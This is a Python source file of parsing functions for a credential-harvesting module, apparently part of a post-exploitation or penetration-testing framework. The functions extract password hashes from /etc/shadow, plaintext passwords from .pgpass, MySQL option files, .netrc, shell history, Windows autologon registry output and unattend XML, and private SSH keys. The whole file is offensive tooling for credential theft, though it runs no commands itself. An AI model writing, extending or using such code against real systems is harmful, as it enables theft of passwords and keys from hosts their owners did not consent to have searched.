"""Pure parsers for credential harvesting (no commands run here -> easy to test).

Each returns a list of dicts shaped for Module.add_credential():
{username, secret, kind, service}. Secrets are returned as-is; the caller
stores them and the RPC layer redacts the value on the wire.
"""
from __future__ import annotations

import re

Cred = dict[str, str]


def parse_shadow(text: str) -> list[Cred]:
    """/etc/shadow lines -> (user, hash). Only rows with a real hash field."""
    out: list[Cred] = []
    for line in text.splitlines():
        parts = line.split(":")
        if len(parts) < 2:
            continue
        user, h = parts[0].strip(), parts[1].strip()
        if h.startswith("$") and len(h) > 10:          # $6$... etc, not * or !
            out.append({"username": user, "secret": h, "kind": "hash",
                        "service": "unix"})
    return out


def parse_pgpass(text: str) -> list[Cred]:
    """~/.pgpass: host:port:db:user:password."""
    out: list[Cred] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        f = line.split(":")
        if len(f) >= 5 and f[4]:
            out.append({"username": f[3], "secret": f[4], "kind": "password",
                        "service": "postgres"})
    return out


def parse_mycnf(text: str) -> list[Cred]:
    """MySQL option file: user=/password= under any section."""
    user = pw = ""
    for line in text.splitlines():
        m = re.match(r"\s*user\s*=\s*(.+)", line)
        if m:
            user = m.group(1).strip().strip('"\'')
        m = re.match(r"\s*password\s*=\s*(.+)", line)
        if m:
            pw = m.group(1).strip().strip('"\'')
    return [{"username": user, "secret": pw, "kind": "password", "service": "mysql"}] if pw else []


def parse_history(text: str) -> list[Cred]:
    """Shell history: inline passwords in common command patterns."""
    out: list[Cred] = []
    for line in text.splitlines():
        m = re.search(r"sshpass\s+-p\s*'?\"?([^\s'\"]+)", line)
        if m:
            out.append({"username": "", "secret": m.group(1), "kind": "password",
                        "service": "ssh-history"})
        m = re.search(r"mysql\b.*-u\s*(\S+).*-p'?\"?([^\s'\"]+)", line)
        if m:
            out.append({"username": m.group(1), "secret": m.group(2),
                        "kind": "password", "service": "mysql-history"})
        m = re.search(r"https?://([^:/@\s]+):([^@/\s]+)@", line)
        if m:
            out.append({"username": m.group(1), "secret": m.group(2),
                        "kind": "password", "service": "url-history"})
    return out


def parse_ssh_keys(text: str) -> list[Cred]:
    """Blocks emitted as '@@KEY@@ <path>' then the key body -> stored keys."""
    out: list[Cred] = []
    path = ""
    body: list[str] = []

    def flush() -> None:
        if path and any("PRIVATE KEY" in b for b in body):
            out.append({"username": _user_from_path(path),
                        "secret": "\n".join(body).strip(), "kind": "ssh_key",
                        "service": "ssh"})

    for line in text.splitlines():
        if line.startswith("@@KEY@@ "):
            flush()
            path = line[len("@@KEY@@ "):].strip()
            body = []
        else:
            body.append(line)
    flush()
    return out


def parse_win_autologon(text: str) -> list[Cred]:
    """reg query Winlogon -> DefaultUserName / DefaultPassword."""
    user = pw = ""
    mu = re.search(r"DefaultUserName\s+REG_SZ\s+(\S+)", text)
    mp = re.search(r"DefaultPassword\s+REG_SZ\s+(\S+)", text)
    if mu:
        user = mu.group(1)
    if mp:
        pw = mp.group(1)
    return [{"username": user, "secret": pw, "kind": "password",
             "service": "windows-autologon"}] if pw else []


def parse_unattend(text: str) -> list[Cred]:
    """Unattend/sysprep XML: <Username>/<Password><Value>...</Value>."""
    out: list[Cred] = []
    user_m = re.search(r"<Username>([^<]+)</Username>", text)
    user = user_m.group(1).strip() if user_m else ""
    for m in re.finditer(r"<Password>.*?<Value>([^<]+)</Value>", text, re.DOTALL):
        pw = m.group(1).strip()
        if pw:
            out.append({"username": user, "secret": pw, "kind": "password",
                        "service": "windows-unattend"})
    return out


def parse_netrc(text: str) -> list[Cred]:
    """~/.netrc: machine/login/password tokens (single- or multi-line)."""
    out: list[Cred] = []
    toks = text.split()
    machine = login = pw = ""

    def flush() -> None:
        if login and pw:
            svc = f"netrc:{machine}" if machine else "netrc"
            out.append({"username": login, "secret": pw, "kind": "password",
                        "service": svc})

    i = 0
    while i < len(toks):
        t = toks[i]
        if t in ("machine", "default"):
            flush()
            machine = toks[i + 1] if (t == "machine" and i + 1 < len(toks)) else ""
            login = pw = ""
            i += 2 if t == "machine" else 1
            continue
        if t == "login" and i + 1 < len(toks):
            login = toks[i + 1]
            i += 2
            continue
        if t == "password" and i + 1 < len(toks):
            pw = toks[i + 1]
            i += 2
            continue
        i += 1
    flush()
    return out


def _user_from_path(path: str) -> str:
    m = re.search(r"/home/([^/]+)/", path) or re.search(r"/Users/([^/]+)/", path)
    if m:
        return m.group(1)
    if "/root/" in path:
        return "root"
    return "(key)"
